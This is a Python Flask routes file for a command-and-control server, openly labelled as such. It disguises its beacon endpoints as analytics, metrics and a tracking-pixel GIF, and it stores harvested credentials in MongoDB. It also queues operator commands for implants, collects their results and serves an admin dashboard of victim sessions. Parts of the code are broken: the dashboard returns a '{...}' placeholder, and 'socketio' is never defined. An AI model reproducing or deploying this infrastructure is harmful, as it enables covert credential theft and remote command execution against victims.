# backend/routes/c2_routes.py
from flask import Blueprint, request, jsonify, current_app, session
from mongodb.database import db
from datetime import datetime
from bson.objectid import ObjectId
import json

# Create blueprint
c2_bp = Blueprint('c2_routes', __name__)

# Track active sessions
active_sessions = {}
command_queue = {}

@c2_bp.route('/analytics/collect', methods=['POST'])
def collect_analytics():
    """C2 primary endpoint disguised as analytics collection"""
    try:
        data = request.json
        session_id = request.headers.get('X-Session-ID')
        
        if not session_id or not data:
            return jsonify({"status": "error", "message": "Invalid request"}), 400
        
        # Store data in MongoDB
        document = {
            "session_id": session_id,
            "type": data.get("type", "unknown"),
            "timestamp": datetime.utcnow(),
            "data": data.get("data", {}),
            "payload": data.get("payload", {}),
            "ip": request.remote_addr,
            "user_agent": request.headers.get('User-Agent', 'Unknown')
        }
        
        # Insert into appropriate collection based on data type
        if data.get("type") == "credentials":
            db.harvested_credentials.insert_one(document)
        else:
            db.c2_beacons.insert_one(document)
        
        # Update active sessions
        active_sessions[session_id] = {
            "last_seen": datetime.utcnow(),
            "ip": request.remote_addr,
            "user_agent": request.headers.get('User-Agent'),
            "session_id": session_id
        }
        
        # Check for commands to send back
        commands = command_queue.get(session_id, [])
        
        # Clear sent commands
        if session_id in command_queue:
            command_queue[session_id] = []
        
        return jsonify({
            "status": "success",
            "message": "Data received",
            "commands": commands
        })
    
    except Exception as e:
        current_app.logger.error(f"Error in analytics collect: {str(e)}")
        return jsonify({"status": "error", "message": "Internal error"}), 500

@c2_bp.route('/metrics/push', methods=['POST'])
def push_metrics():
    """C2 fallback endpoint disguised as metrics collection"""
    return collect_analytics()

@c2_bp.route('/payload/store', methods=['POST'])
def store_payload():
    """Endpoint to receive harvested credentials"""
    try:
        data = request.json
        session_id = request.headers.get('X-Session-ID')
        
        if not session_id or not data:
            return jsonify({"status": "error", "message": "Invalid request"}), 400
        
        # Store credentials in MongoDB
        document = {
            "session_id": session_id,
            "timestamp": datetime.utcnow(),
            "source": data.get("source"),
            "data": data.get("data"),
            "url": data.get("url", request.referrer),
            "ip": request.remote_addr,
            "user_agent": request.headers.get('User-Agent')
        }
        
        db.harvested_credentials.insert_one(document)
        
        # Update active sessions
        if session_id not in active_sessions:
            active_sessions[session_id] = {
                "last_seen": datetime.utcnow(),
                "ip": request.remote_addr,
                "user_agent": request.headers.get('User-Agent'),
                "session_id": session_id
            }
        else:
            active_sessions[session_id]["last_seen"] = datetime.utcnow()
        
        return jsonify({"status": "success", "message": "Payload stored"})
    
    except Exception as e:
        current_app.logger.error(f"Error storing payload: {str(e)}")
        return jsonify({"status": "error", "message": "Internal error"}), 500

@c2_bp.route('/scenario/fetch', methods=['POST'])
def fetch_commands():
    """Endpoint for implants to fetch commands"""
    try:
        data = request.json
        session_id = request.headers.get('X-Session-ID')
        
        if not session_id:
            return jsonify({"status": "error", "message": "Invalid request"}), 400
        
        # Store system info if provided
        if data and "systemInfo" in data:
            db.c2_systems.update_one(
                {"session_id": session_id},
                {"$set": {
                    "system_info": data["systemInfo"],
                    "last_updated": datetime.utcnow()
                }},
                upsert=True
            )
        
        # Update active sessions
        if session_id not in active_sessions:
            active_sessions[session_id] = {
                "last_seen": datetime.utcnow(),
                "ip": request.remote_addr,
                "user_agent": request.headers.get('User-Agent'),
                "session_id": session_id
            }
        else:
            active_sessions[session_id]["last_seen"] = datetime.utcnow()
        
        # Get commands for this session
        commands = command_queue.get(session_id, [])
        
        # Mark commands as sent and move to history
        if commands:
            for command in commands:
                command["sent_at"] = datetime.utcnow()
                
                db.c2_command_history.insert_one({
                    "session_id": session_id,
                    "command_id": command["id"],
                    "command_type": command["type"],
                    "params": command["params"],
                    "created_at": command["created_at"],
                    "sent_at": command["sent_at"],
                    "status": "sent"
                })
            
            # Clear commands for this session
            command_queue[session_id] = []
        
        return jsonify({
            "status": "success",
            "commands": commands
        })
    
    except Exception as e:
        current_app.logger.error(f"Error fetching commands: {str(e)}")
        return jsonify({"status": "error", "message": "Internal error"}), 500

@c2_bp.route('/scenario/submit', methods=['POST'])
def submit_results():
    """Endpoint for implants to submit command results"""
    try:
        data = request.json
        session_id = request.headers.get('X-Session-ID')
        command_id = data.get("commandId")
        
        if not session_id or not command_id or "result" not in data:
            return jsonify({"status": "error", "message": "Invalid request"}), 400
        
        # Store command result
        db.c2_command_results.insert_one({
            "session_id": session_id,
            "command_id": command_id,
            "result": data["result"],
            "timestamp": datetime.utcnow(),
            "ip": request.remote_addr
        })
        
        # Update command history
        db.c2_command_history.update_one(
            {"session_id": session_id, "command_id": command_id},
            {"$set": {
                "status": "completed",
                "completed_at": datetime.utcnow()
            }}
        )
        
        return jsonify({"status": "success", "message": "Results received"})
    
    except Exception as e:
        current_app.logger.error(f"Error submitting results: {str(e)}")
        return jsonify({"status": "error", "message": "Internal error"}), 500


# Admin routes for C2 management
@c2_bp.route('/c2/sessions', methods=['GET'])
def list_sessions():
    if not session.get('cracked_admin_logged_in'):
        return jsonify({"error": "Admin authentication required"}), 401
    
    try:
        sessions_list = []
        
        for session_id, data in active_sessions.items():
            # Create a basic session structure even if data is incomplete
            session_entry = {
                "session_id": session_id,
                "last_seen": data.get("last_seen", "").isoformat() if isinstance(data.get("last_seen"), datetime) else "",
                "ip": data.get("ip", "unknown"),
                "user_agent": data.get("user_agent", "unknown"),
                "system_info": {},
                "online": False,
                "beacon_count": 0,
                "credentials_count": 0,
                "command_count": 0,
                "pending_commands": 0
            }
            
            # Try to enhance with additional data if available
            try:
                system_info = db.c2_systems.find_one({"session_id": session_id})
                if system_info:
                    session_entry["system_info"] = system_info.get("system_info", {})
                
                session_entry["beacon_count"] = db.c2_beacons.count_documents({"session_id": session_id})
                session_entry["credentials_count"] = db.harvested_credentials.count_documents({"session_id": session_id})
                session_entry["command_count"] = db.c2_command_history.count_documents({"session_id": session_id})
                
                # Calculate online status
                if data.get("last_seen"):
                    time_diff = datetime.utcnow() - data["last_seen"]
                    session_entry["online"] = time_diff.total_seconds() < 300
                
                session_entry["pending_commands"] = len(command_queue.get(session_id, []))
            except Exception as e:
                # If any error occurs, log it but still include basic session info
                current_app.logger.error(f"Error enhancing session data: {str(e)}")
            
            sessions_list.append(session_entry)
        
        return jsonify({
            "status": "success",
            "sessions": sessions_list
        }), 200
        
    except Exception as e:
        current_app.logger.error(f"Error listing sessions: {str(e)}")
        return jsonify({
            "status": "error",
            "message": f"Internal error: {str(e)}",
            "sessions": []
        }), 200  # Return 200 with empty sessions list

@c2_bp.route('/c2/sessions/<session_id>', methods=['GET'])
def get_session_details(session_id):
    """Get detailed information about a specific session"""
    if not session.get('cracked_admin_logged_in'):
        return jsonify({"error": "Admin authentication required"}), 401
    
    try:
        # Get session data
        session_data = active_sessions.get(session_id)
        if not session_data:
            return jsonify({"status": "error", "message": "Session not found"}), 404
        
        # Get system info
        system_info = db.c2_systems.find_one({"session_id": session_id})
        
        # Get latest beacons (limit to 10)
        beacons = list(db.c2_beacons.find(
            {"session_id": session_id},
            sort=[("timestamp", -1)],
            limit=10
        ))
        
        # Convert ObjectId to string for JSON serialization
        for beacon in beacons:
            beacon["_id"] = str(beacon["_id"])
        
        # Get latest credentials (limit to 10)
        credentials = list(db.harvested_credentials.find(
            {"session_id": session_id},
            sort=[("timestamp", -1)],
            limit=10
        ))
        
        # Convert ObjectId to string for JSON serialization
        for cred in credentials:
            cred["_id"] = str(cred["_id"])
        
        # Get command history (limit to 20)
        commands = list(db.c2_command_history.find(
            {"session_id": session_id},
            sort=[("created_at", -1)],
            limit=20
        ))
        
        # Convert ObjectId to string for JSON serialization
        for cmd in commands:
            cmd["_id"] = str(cmd["_id"])
        
        return jsonify({
            "status": "success",
            "session": {
                "session_id": session_id,
                "last_seen": session_data.get("last_seen").isoformat() if session_data.get("last_seen") else None,
                "ip": session_data.get("ip", "unknown"),
                "user_agent": session_data.get("user_agent", "unknown"),
                "system_info": system_info.get("system_info", {}) if system_info else {},
                "beacons": beacons,
                "credentials": credentials,
                "commands": commands,
                "pending_commands": command_queue.get(session_id, [])
            }
        })
    
    except Exception as e:
        current_app.logger.error(f"Error getting session details: {str(e)}")
        return jsonify({"status": "error", "message": f"Internal error: {str(e)}"}), 500

@c2_bp.route('/c2/sessions/<session_id>/credentials', methods=['GET'])
def get_session_credentials(session_id):
    """Get all credentials for a specific session"""
    if not session.get('cracked_admin_logged_in'):
        return jsonify({"error": "Admin authentication required"}), 401
    
    try:
        # Check if session exists
        if session_id not in active_sessions:
            return jsonify({"status": "error", "message": "Session not found"}), 404
        
        # Get all credentials for this session
        credentials = list(db.harvested_credentials.find(
            {"session_id": session_id},
            sort=[("timestamp", -1)]
        ))
        
        # Convert ObjectId to string for JSON serialization
        for cred in credentials:
            cred["_id"] = str(cred["_id"])
        
        return jsonify({
            "status": "success",
            "session_id": session_id,
            "credentials": credentials
        })
    
    except Exception as e:
        current_app.logger.error(f"Error getting session credentials: {str(e)}")
        return jsonify({"status": "error", "message": f"Internal error: {str(e)}"}), 500

@c2_bp.route('/c2/sessions/<session_id>/command', methods=['POST'])
def queue_command(session_id):
    """Queue a new command for a specific session"""
    if not session.get('cracked_admin_logged_in'):
        return jsonify({"error": "Admin authentication required"}), 401
    
    try:
        # Check if session exists
        if session_id not in active_sessions:
            return jsonify({"status": "error", "message": "Session not found"}), 404
        
        # Get command data
        data = request.json
        if not data or 'type' not in data or 'params' not in data:
            return jsonify({"status": "error", "message": "Invalid command data"}), 400
        
        # Create command
        command = {
            "id": str(ObjectId()),
            "type": data["type"],
            "params": data["params"],
            "created_at": datetime.utcnow(),
            "created_by": session.get('admin_username', 'unknown')
        }
        
        # Add to queue
        if session_id not in command_queue:
            command_queue[session_id] = []
        
        command_queue[session_id].append(command)
        
        # Add to history
        db.c2_command_history.insert_one({
            "session_id": session_id,
            "command_id": command["id"],
            "command_type": command["type"],
            "params": command["params"],
            "created_at": command["created_at"],
            "created_by": command["created_by"],
            "status": "queued"
        })
        
        return jsonify({
            "status": "success",
            "message": "Command queued",
            "command": command
        })
    
    except Exception as e:
        current_app.logger.error(f"Error queuing command: {str(e)}")
        return jsonify({"status": "error", "message": f"Internal error: {str(e)}"}), 500

@c2_bp.route('/c2/commands/<command_id>/results', methods=['GET'])
def get_command_results(command_id):
    """Get results for a specific command"""
    if not session.get('cracked_admin_logged_in'):
        return jsonify({"error": "Admin authentication required"}), 401
    
    try:
        # Get command result
        result = db.c2_command_results.find_one({"command_id": command_id})
        if not result:
            return jsonify({"status": "error", "message": "Command result not found"}), 404
        
        # Convert ObjectId to string
        result["_id"] = str(result["_id"])
        
        return jsonify({
            "status": "success",
            "command_id": command_id,
            "result": result
        })
    
    except Exception as e:
        current_app.logger.error(f"Error getting command results: {str(e)}")
        return jsonify({"status": "error", "message": f"Internal error: {str(e)}"}), 500

@c2_bp.route('/metrics/pixel.gif', methods=['GET'])
def tracking_pixel():
    """Handle tracking pixel requests (for beacon data)"""
    try:
        session_id = request.args.get('sid')
        data = request.args.get('data')
        
        if session_id and data:
            # Store the beacon
            db.c2_beacons.insert_one({
                "session_id": session_id,
                "timestamp": datetime.utcnow(),
                "data": data,
                "type": "pixel",
                "ip": request.remote_addr,
                "user_agent": request.headers.get('User-Agent', 'Unknown'),
                "referer": request.headers.get('Referer', 'Unknown')
            })
            
            # Update active sessions
            if session_id not in active_sessions:
                active_sessions[session_id] = {
                    "last_seen": datetime.utcnow(),
                    "ip": request.remote_addr,
                    "user_agent": request.headers.get('User-Agent'),
                    "session_id": session_id
                }
            else:
                active_sessions[session_id]["last_seen"] = datetime.utcnow()
        
        # Return a 1x1 transparent GIF
        gif_data = b'GIF89a\x01\x00\x01\x00\x80\x00\x00\x00\x00\x00\x00\x00\x00!\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;'
        return gif_data, 200, {'Content-Type': 'image/gif'}
    
    except Exception as e:
        current_app.logger.error(f"Error handling tracking pixel: {str(e)}")
        # Still return a GIF to avoid errors in the browser
        gif_data = b'GIF89a\x01\x00\x01\x00\x80\x00\x00\x00\x00\x00\x00\x00\x00!\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;'
        return gif_data, 200, {'Content-Type': 'image/gif'}


@c2_bp.route('/c2/credentials', methods=['GET'])
def get_all_credentials():
    """Get all harvested credentials"""
    if not session.get('cracked_admin_logged_in'):
        return jsonify({"error": "Admin authentication required"}), 401
    
    try:
        # Get all credentials
        credentials = list(db.harvested_credentials.find().sort("timestamp", -1))
        
        # Convert ObjectId to string for JSON serialization
        for cred in credentials:
            cred["_id"] = str(cred["_id"])
        
        return jsonify({
            "status": "success",
            "credentials": credentials
        })
    
    except Exception as e:
        current_app.logger.error(f"Error getting all credentials: {str(e)}")
        return jsonify({"status": "error", "message": f"Internal error: {str(e)}"}), 500

@c2_bp.route('/c2/dashboard', methods=['GET'])
def c2_dashboard():
    """Get summary statistics for the C2 dashboard"""
    from flask import session, jsonify, current_app
    from datetime import datetime, timedelta
    
    if not session.get('cracked_admin_logged_in'):
        return jsonify({"error": "Admin authentication required"}), 401
    
    try:
        # Count active sessions (active in last 5 minutes)
        active_count = 0
        five_min_ago = datetime.utcnow() - timedelta(minutes=5)
        
        for session_data in active_sessions.values():
            if session_data.get("last_seen") and session_data["last_seen"] > five_min_ago:
                active_count += 1
        
        # Count total sessions
        total_sessions = len(active_sessions)
        
        # Count total credentials
        total_credentials = db.harvested_credentials.count_documents({})
        
        # Count commands
        total_commands = db.c2_command_history.count_documents({})
        completed_commands = db.c2_command_history.count_documents({"status": "completed"})
        
        # Get recent activity (last 10 events)
        recent_activity = []
        
        # Get recent commands
        recent_commands = list(db.c2_command_history.find(
            {},
            sort=[("created_at", -1)],
            limit=5
        ))
        
        for cmd in recent_commands:
            # Convert ObjectId to string
            if '_id' in cmd:
                cmd['_id'] = str(cmd['_id'])
                
            recent_activity.append({
                "type": "command",
                "session_id": cmd["session_id"],
                "command_type": cmd["command_type"],
                "status": cmd["status"],
                "timestamp": cmd["created_at"]
            })
        
        # Get recent credentials
        recent_creds = list(db.harvested_credentials.find(
            {},
            sort=[("timestamp", -1)],
            limit=5
        ))
        
        for cred in recent_creds:
            # Convert ObjectId to string
            if '_id' in cred:
                cred['_id'] = str(cred['_id'])
                
            recent_activity.append({
                "type": "credential",
                "session_id": cred["session_id"],
                "source": cred.get("source", "unknown"),
                "timestamp": cred["timestamp"]
            })
        
        # Sort by timestamp
        recent_activity.sort(key=lambda x: x["timestamp"], reverse=True)
        
        # Limit to 10
        recent_activity = recent_activity[:10]
        
        # Convert timestamps to strings for serialization
        for activity in recent_activity:
            if isinstance(activity["timestamp"], datetime):
                activity["timestamp"] = activity["timestamp"].isoformat()
        
        # Get system statistics
        system_counts = {
            "windows": db.c2_systems.count_documents({"system_info.osName": "Windows"}),
            "macos": db.c2_systems.count_documents({"system_info.osName": "MacOS"}),
            "linux": db.c2_systems.count_documents({"system_info.osName": "Linux"}),
            "other": db.c2_systems.count_documents({
                "system_info.osName": {"$nin": ["Windows", "MacOS", "Linux"]}
            })
        }
        
        # Get browser statistics
        browser_counts = {
            "chrome": db.c2_systems.count_documents({"system_info.browserName": "Chrome"}),
            "firefox": db.c2_systems.count_documents({"system_info.browserName": "Firefox"}),
            "safari": db.c2_systems.count_documents({"system_info.browserName": "Safari"}),
            "edge": db.c2_systems.count_documents({"system_info.browserName": "Edge"}),
            "other": db.c2_systems.count_documents({
                "system_info.browserName": {"$nin": ["Chrome", "Firefox", "Safari", "Edge"]}
            })
        }
        
        return jsonify({
            "status": "success",
            "statistics": {...}
        }), 200
    except Exception as e:
        current_app.logger.error(f"Error in C2 dashboard: {str(e)}")
        return jsonify({
            "status": "error", 
            "message": "Internal server error",
            "statistics": {
                "active_sessions": 0,
                "total_sessions": 0,
                "total_credentials": 0,
                "total_commands": 0,
                "completed_commands": 0,
                "system_stats": {},
                "browser_stats": {},
                "recent_activity": []
            }
        }), 200  
        
        
def notify_admin_new_session(session_id, session_data):
    """Notify admin of new session"""
    socketio.emit('c2_new_session', {
        'session_id': session_id,
        'data': session_data
    }, room='c2_admin')

def notify_admin_new_credential(credential):
    """Notify admin of new credential"""
    socketio.emit('c2_new_credential', {
        'credential': credential
    }, room='c2_admin')

def notify_admin_command_complete(command_id, result):
    """Notify admin of completed command"""
    socketio.emit('c2_command_complete', {
        'command_id': command_id,
        'result': result
    }, room='c2_admin')
